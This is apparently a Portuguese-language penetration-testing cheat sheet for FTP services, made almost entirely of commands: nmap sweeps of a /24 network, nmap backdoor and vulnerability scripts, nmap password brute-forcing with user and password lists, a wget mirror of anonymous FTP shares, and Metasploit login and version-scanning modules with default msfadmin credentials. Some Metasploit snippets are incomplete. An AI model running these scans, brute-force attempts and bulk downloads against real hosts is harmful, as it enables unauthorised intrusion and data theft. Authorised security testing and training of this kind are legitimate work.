# FTP - Pentesting

* Enumerando a rede 192.168.0.0/24 , procurando portas 21,2121 possiveis porta FTP abertas --open, -Pn nao utilizar ping.
* Otimizando a pesquisa, com apenas -sS (SYN Scan) e criamos a lista de hosts -oG, -v (verbose). 

  nmap -v -sS -p21,2121 --open -Pn 192.168.0.0/24 -oG ftp-21-2121-open.txt

* Ajustando a lista criada anteriormente, para uso em outros programas, removendo os comentarios ficando apenas os ips necessarios.

  cat ftp-21-2121-open.txt | grep "Up" | cut -d " " -f 2 > targetsFTP.txt

* Caso desejar fazer um full scan na rede, a procura de serviços e descobrir outras portas FTP, podemos utilizar as opções.
* -sV para versão, logo criamos nossa lista para analise manual. lembrando que nem todas as redes é permitido full scan -p- .
* vamos utilizar o modo discovery -sS -sV -sC
  
  nmap -v -sS -sV -sC -p- --open -Pn 192.168.0.0/24 -oG Full-open-discov.txt

* Com as portas e hosts com FTP rodando vamos utilizar o proprio nmap com os script para FTP, -iL utilizaremos a lista criada, lembrando apenas IP.

  nmap -v --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -iL targetsFTP.txt

# Modulo nmap de Brute Force
  
  nmap --script ftp-brute -p21 -iL targetsFTP.txt --script-args userdb=users.txt,passdb=passwords.txt
  
# Baixando todos os arquivos compartilhados no servidor FTP, utilizando usuario anonymous 

  wget -m --no-passive ftp://anonymous:anonymous@IP_SERVIDOR

# Modulos do Metasploit

# anonymous
  
  set RHOSTS 192.168.1
  
  set THREADS 55
  
  run
 
# ftp_login

  set RHOSTS 192.168.1
  
  set THREADS 55
  
  set PASSWORD msfadmin 
  
  set USERNAME msfadmin
  
  run
  
# ftp_version 

  use auxiliary/scanner/ftp/ftp_version
  
  show options
  
  set RHOSTS 192.168.0.7 
  
  run
